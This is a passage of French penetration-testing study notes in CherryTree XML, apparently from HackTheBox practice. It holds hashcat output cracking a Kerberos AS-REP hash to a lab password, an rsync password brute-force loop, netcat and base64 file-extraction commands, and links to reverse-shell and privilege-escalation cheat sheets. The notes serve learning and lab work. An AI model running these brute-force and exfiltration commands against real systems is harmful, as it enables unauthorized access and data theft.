* Optimized-Kernel
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=18200 -D _unroll'
* Device #1: Kernel m18200_a0-optimized.2b262230.kernel not found in cache! Building may take a while...
Dictionary cache built:
* Filename..: ../../tools/wordlist/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

$krb5asrep$23$svc-alfresco@HTB.LOCAL:f26e2d83a61e519f5b4b34c08bc39daf$8e855ad842448aca2f030281624db45d217a8b5ab72d0c10eede9defe517a3a64c0675f55291427326e9c30c8d287dabc9946ca767981ce569b49a8a6bb9893182461643ef99392ebd2c171fdceccfb0bb9f1eee0c49db16bb3cf7384f4d3ccf99d70a331db94121403933b9c1821cd1000d3112d375565facb7ef9ca953cf1d2201a307d3f4c1f9331e9589a516bbe13858a73a00b501d532eff8fd5c7a9a70b66d35464952032980809bf7cd59aadcf91bd368f6467a3512dc0df95347890d2bbc6b212c1b9215c7e211c64809c3fc99f129347701ecad6b633f77c1dd39639658da09e323:s3rvice
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 AS-REP etype 23
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:f26e2d83a61e51...09e323
Time.Started.....: Tue Apr 14 11:16:30 2020 (13 secs)
Time.Estimated...: Tue Apr 14 11:16:43 2020 (0 secs)
Guess.Base.......: File (../../tools/wordlist/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   324.0 kH/s (7.76ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 4088738/14344385 (28.50%)
Rejected.........: 930/4088738 (0.02%)
Restore.Point....: 4084641/14344385 (28.48%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: s469244 -&gt; s2125223

Started: Tue Apr 14 11:16:14 2020
Stopped: Tue Apr 14 11:16:43 2020</codebox>
					<codebox char_offset="2155" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True"> egrep ‘^.{,9}$’ /usr/dahre/wordlists/rockyou.txt &gt; my_word_list_8_9.txt</codebox>
					<codebox char_offset="2241" frame_height="240" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">#!/bin/bash
for pass in $(cat wordlist.txt);
do 
    export RSYNC_PASSWORD=$pass
    # rsync -q rsync rsync://roy[dead:beef::250:56ff:feb9:c2ce]:8730/home/roy --list_only 2&gt;/dev/null
    rsync -q rsync rsync://user[adress_ip]:port/destination_path --list_only 2&gt;/dev/null
    
    if [[ $? -eq 0 ]]
    then
        echo “Pass: $pass”
        break
    fi    
done</codebox>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="Extraction de données" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587482884.1" ts_lastsave="1588221243.22" unique_id="174">
					<rich_text>
Envoyer des fichiers via netcat :
Source :
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>
Destination :
</rich_text>
					<rich_text justification="left"></rich_text>
					<rich_text>

nc -l -p 6969 -q 1 &gt; linpeas.sh &lt; /dev/null


</rich_text>
					<rich_text scale="h2">Pour extraire des fichiers en les copiant d'un terminal vers un autre :</rich_text>
					<rich_text>
cat fichier | base64 -w 0

sur l'autre machine
echo “texte en base64” | base64 -d &gt; destination</rich_text>
					<codebox char_offset="44" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">cat nom_fichier | netcat ip_cible port_cible</codebox>
					<codebox char_offset="60" frame_height="20" frame_width="700" highlight_brackets="True" show_line_numbers="True" syntax_highlighting="sh" width_in_pixels="True">nc -l -p port_cible -q 1 &gt; fichier_final &lt; /dev/null</codebox>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="rope" prog_lang="custom-colors" readonly="False" tags="" ts_creation="0.0" ts_lastsave="1587513292.22" unique_id="139">
					<rich_text>ropestar
</rich_text>
				</node>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Ressources" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587468920.69" ts_lastsave="1587484060.08" unique_id="19">
			<rich_text></rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Site et outils" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587484060.12" ts_lastsave="1588258494.67" unique_id="175">
				<rich_text>Référence toutes les méthodes pour les app connues
sudo -l -&gt; https://gtfobins.github.io/

• navigateur de recherche des vidéos d'ippsec :
</rich_text>
				<rich_text link="webs https://ippsec.rocks/#">https://ippsec.rocks/#</rich_text>
				<rich_text>

1- Outil pour décoder en ligne :
</rich_text>
				<rich_text link="webs https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</rich_text>
				<rich_text>

3- Trouver des informations sensibles dans des repository github
</rich_text>
				<rich_text link="webs https://github.com/zricethezav/gitleaks.git">https://github.com/zricethezav/gitleaks.git</rich_text>
				<rich_text>

4- Liste des reverse shell en une ligne
</rich_text>
				<rich_text link="webs http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</rich_text>
				<rich_text>
en français
</rich_text>
				<rich_text link="webs https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/">https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/</rich_text>
				<rich_text>


5-Elevation de privilège windows
</rich_text>
				<rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</rich_text>
				<rich_text>

6-windows ACL / powerview
</rich_text>
				<rich_text link="webs https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces">https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces</rich_text>
				<rich_text>
</rich_text>
				<rich_text link="webs http://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/">http://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/</rich_text>
				<rich_text>
Correspondance :
</rich_text>
				<rich_text link="webs https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/1522b774-6464-41a3-87a5-1e5633c3fbbb">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/1522b774-6464-41a3-87a5-1e5633c3fbbb</rich_text>
				<rich_text>




Formation :
audit windows
</rich_text>
				<rich_text link="webs https://www.ssi.gouv.fr/uploads/IMG/pdf/Audit_des_permissions_en_environnement_Active_Directory_article.pdf">https://www.ssi.gouv.fr/uploads/IMG/pdf/Audit_des_permissions_en_environnement_Active_Directory_article.pdf</rich_text>
			</node>
		</node>
	</node>
	<node custom_icon_id="0" foreground="" is_bold="False" name="brouillon" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588250272.75" ts_lastsave="1588250278.98" unique_id="16">
		<rich_text></rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="windows" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588250278.98" ts_lastsave="1588258503.92" unique_id="17">
			<rich_text></rich_text>
		</node>
	</node>
</cherrytree>
